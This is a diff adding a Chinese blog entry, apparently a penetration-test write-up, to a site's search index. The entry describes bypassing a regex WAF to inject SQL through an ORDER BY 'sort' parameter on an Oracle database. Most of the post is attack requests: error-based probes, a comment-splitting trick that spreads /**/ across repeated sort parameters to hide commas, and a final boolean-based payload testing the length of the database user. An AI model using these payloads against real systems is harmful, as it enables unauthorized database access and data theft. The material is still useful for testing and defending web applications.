@@ -791,4 +791,57 @@
         <tag>shiro</tag>
       </tags>
   </entry>
+  <entry>
+    <title>记一次简单的SQL注入Bypass</title>
+    <url>//blogs/orderby_Bypass/</url>
+    <content><![CDATA[<p>首先看下正常的请求和返回包</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysite/page?page=1&amp;size=40&amp;sort=name,asc</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/1/image-20230621103219677.png" alt="image-20230621103219677"></p>
+<p>有个关键字asc，这个关键字一般跟在order by后面，且在预编译中，表名和排序方式不能被预编译，所以出现asc时可以试一下注入。</p>
+<p>简单fuzz一下规则，一是看看会不会有报错信息，如果有报错信息的话可以进一步了解参数值转换成SQL语句时是怎么处理的。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysite/page?page=1&amp;size=40&amp;sort=name,asc,1</span><br></pre></td></tr></table></figure>
+
+<p>报错，直接返回了报错信息，根据报错信息可以得到SQL语句和数据库</p>
+<p><img src="/../images/1/image-20230621103448149.png" alt="image-20230621103448149"></p>
+<p>sort&#x3D;name,asc,1时，传入到数据库中的句子会变成</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">order by name asc,asc asc,1 asc</span><br></pre></td></tr></table></figure>
+
+<p>简单猜测规则：order by后面的数据可控，且会将sort的参数全部进行排序</p>
+<p>尝试报错注入</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysite/page?page=1&amp;size=40&amp;sort=name,utl_inaddr.get_host_name((SELECT+USER+FROM+DUAL)) </span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/1/image-20230621103900333.png" alt="image-20230621103900333"></p>
+<p>返回502状态码，应该是nginx转发流量时被内网的设备拦截</p>
+<p>尝试多次传入sort参数看下效果</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysite/page?page=1&amp;size=40&amp;sort=name&amp;sort=10000</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/1/image-20230621104133117.png" alt="image-20230621104133117"></p>
+<p>传入的SQL经过处理变为</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">order by name asc,10000 asc</span><br></pre></td></tr></table></figure>
+
+<p>也会进行排序，可以利用这一点进行waf的绕过</p>
+<p>首先waf是基于正则进行拦截的，但是通过多个sort的参数进行传输数据肯定不会命中waf的策略，现在只需要想办法可以控制逗号，即可进行注入</p>
+<p>这里可以选择&#x2F;**&#x2F;注释符</p>
+<p>可以这样构造</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysite/page?page=1&amp;size=40&amp;sort=name/\*&amp;sort=\*/10000</span><br></pre></td></tr></table></figure>
+
+<p>此时看下报错</p>
+<p><img src="/../images/1/image-20230621104852545.png" alt="image-20230621104852545"></p>
+<p>SQL为</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">order by name/* asc,*/10000 asc</span><br></pre></td></tr></table></figure>
+
+<p>此时已经将,注释掉</p>
+<p>然后就可以构造完整的payload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysite/page?page=1&amp;size=40&amp;sort=name&amp;sort=1/(case/\*&amp;sort=\*/when+length(user)%3e1+then+1+else+0+end)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/1/image-20230621105156684.png" alt="image-20230621105156684"></p>
+<p>数据正常返回，说明用户名长度&gt;1，之后正常进行注入即可</p>
+]]></content>
+      <tags>
+        <tag>Bypass</tag>
+        <tag>SQL注入</tag>
+        <tag>Oracle</tag>
+      </tags>
+  </entry>
 </search>
